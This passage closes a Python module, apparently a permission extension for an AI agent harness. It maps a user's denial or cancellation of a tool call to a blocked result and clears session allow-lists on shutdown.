        if decision == ApprovalDecision.NO_REASON:
            return ToolCallResult(
                block=True, reason="Denied by the user (reason requested)."
            )
        # CANCEL / Esc / unknown → deny.
        return ToolCallResult(block=True, reason="Denied by the user (cancelled).")

    def _on_shutdown(
        self,
        _event: SessionShutdownHookEvent,
        _ctx: ExtensionContext,
    ) -> None:
        self._session_allows.clear()


__all__ = ["PermissionExtension"]
